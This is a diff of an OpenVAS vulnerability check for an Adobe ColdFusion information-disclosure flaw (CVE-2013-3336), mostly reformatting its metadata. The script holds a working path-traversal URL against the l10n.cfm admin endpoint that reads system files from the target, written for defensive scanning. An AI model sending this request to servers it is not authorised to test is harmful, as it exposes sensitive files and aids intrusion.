@@ -1,6 +1,5 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_coldfusion_59773.nasl 11878 2018-10-12 12:40:08Z cfischer $
 #
 # Adobe ColdFusion  Information Disclosure Vulnerability
 #
@@ -33,7 +32,7 @@ if (description)
   script_cve_id("CVE-2013-3336", "CVE-2013-1389");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_version("$Revision: 11878 $");
+  script_version("2019-05-10T14:24:23+0000");
 
   script_name("Adobe ColdFusion  Information Disclosure Vulnerability");
 
@@ -41,7 +40,7 @@ if (description)
   script_xref(name:"URL", value:"http://www.adobe.com/products/coldfusion/");
   script_xref(name:"URL", value:"http://www.adobe.com/support/security/bulletins/apsb13-13.html");
 
-  script_tag(name:"last_modification", value:"$Date: 2018-10-12 14:40:08 +0200 (Fri, 12 Oct 2018) $");
+  script_tag(name:"last_modification", value:"2019-05-10 14:24:23 +0000 (Fri, 10 May 2019)");
   script_tag(name:"creation_date", value:"2013-05-10 11:21:00 +0200 (Fri, 10 May 2013)");
   script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
@@ -50,13 +49,16 @@ if (description)
   script_dependencies("gb_coldfusion_detect.nasl", "os_detection.nasl");
   script_require_ports("Services/www", 80);
   script_mandatory_keys("coldfusion/installed");
-  script_tag(name:"solution", value:"Apply the patch from the referenced advisory.");
-  script_tag(name:"solution_type", value:"VendorFix");
-  script_tag(name:"summary", value:"Adobe ColdFusion is prone to an information-disclosure vulnerability.
 
-Attackers can exploit this issue to retrieve files stored on the
-server and obtain sensitive information. This may aid in launching
-further attacks.");
+  script_tag(name:"solution", value:"Apply the patch from the referenced advisory.");
+
+  script_tag(name:"solution_type", value:"VendorFix");
+
+  script_tag(name:"summary", value:"Adobe ColdFusion is prone to an information-disclosure vulnerability.");
+
+  script_tag(name:"impact", value:"Attackers can exploit this issue to retrieve files stored on the server
+  and obtain sensitive information. This may aid in launching further attacks.");
+
   script_xref(name:"URL", value:"http://helpx.adobe.com/coldfusion/kb/coldfusion-security-hotfix-apsb13-13.html");
   exit(0);
 }
@@ -73,17 +75,12 @@ files = traversal_files();
 foreach file (keys(files)) {
 
   url = "/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/mail/download.cfm&filename=../../../../../../../../../../../../../../../" +
-        files[file] + "&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisT" +
-        "ag.generatedContent=htp";
-
+        files[file] + "&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp";
   if(http_vuln_check(port:port, url:url,pattern:file)) {
     report = report_vuln_url( port:port, url:url );
     security_message(port:port, data:report);
     exit(0);
-
   }
-
 }
 
 exit(99);
-
